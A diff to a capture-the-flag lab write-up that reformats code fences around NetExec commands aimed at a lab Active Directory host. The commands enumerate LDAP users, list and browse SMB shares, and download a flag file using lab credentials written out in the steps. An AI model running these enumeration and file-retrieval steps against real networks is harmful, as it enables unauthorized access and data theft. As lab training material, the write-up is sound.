@@ -2,7 +2,8 @@
 
 **Blueprint:** `nxc ldap [Target IP] -u [User] -p [Password] --base-dn [Base DN] --users`
 
-**Command:** ```bash
+**Command:** 
+```bash
 nxc ldap 192.168.56.20 -u student -p 'password1234' --base-dn "DC=PENTESTLAB,DC=local" --users
 
 ```
@@ -18,7 +19,8 @@ nxc ldap 192.168.56.20 -u student -p 'password1234' --base-dn "DC=PENTESTLAB,DC=
 
 **Blueprint:** `nxc smb [Target IP] -u [User] -p [Password] --shares`
 
-**Command:** ```bash
+**Command:** 
+```bash
 nxc smb 192.168.56.20 -u svc_app -p 'AppServ1ce!' --shares
 
 ```
@@ -38,7 +40,8 @@ When attempting to check file structures, chaining multiple directories incorrec
 
 The correct approach is to isolate and query a single valid share directly.
 
-**Command:** ```bash
+**Command:**
+```bash
 nxc smb 192.168.56.20 -u svc_app -p 'AppServ1ce!' --share IT --dir
 
 ```
@@ -55,7 +58,8 @@ nxc smb 192.168.56.20 -u svc_app -p 'AppServ1ce!' --share IT --dir
 
 ### Mission 4: Exfiltrate the Target File and Recover the Flag
 
-**Command:** ```bash
+**Command:** 
+```bash
 nxc smb 192.168.56.20 -u svc_app -p 'AppServ1ce!' --share IT --get-file flag_t2.txt flag_t2.txt
 
 ```
